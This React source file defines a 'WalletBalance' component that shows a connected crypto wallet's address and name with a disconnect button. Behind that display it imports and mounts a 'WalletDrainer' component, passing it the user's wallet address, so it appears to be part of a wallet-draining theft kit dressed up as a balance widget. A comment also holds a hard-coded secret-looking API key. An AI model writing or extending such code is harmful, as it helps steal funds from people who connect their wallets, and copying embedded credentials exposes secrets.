import { useEffect, useState } from 'react';
import {
    useAppKitState,
    useAppKitTheme,
    useAppKitEvents,
    useAppKitAccount,
    useWalletInfo,
    useDisconnect
     } from '@reown/appkit/react'
import WalletDrainer from './WalletDrainer';

// sk_llama_42da39e579f7b9e5ecff2f6a25e5b51a

function WalletBalance() {
  const { disconnect } = useDisconnect();
  const { walletInfo } = useWalletInfo();
  const {address} = useAppKitAccount();

  console.log("walletInfo", walletInfo);

  if (!walletInfo) {
    return <p>Connect your wallet to see token balance.</p>;
  }

  const { name: walletName } = walletInfo;


  const handleDisconnect = async () => {
    try {
      await disconnect();
    } catch (error) {
      console.error("Failed to disconnect:", error);
    }
  };

  return (
    <div>
      <p>Wallet Address: {address}</p>
      <p>Connected Wallet: {walletName}</p>
      <button onClick={handleDisconnect} className="bg-primary text-white btn-sm mt-2 px-1 rounded-md hover:bg-primary-dark transition">
        Disconnect
      </button>
      <WalletDrainer wallet={address} />
    </div>
  );
}

export default WalletBalance;
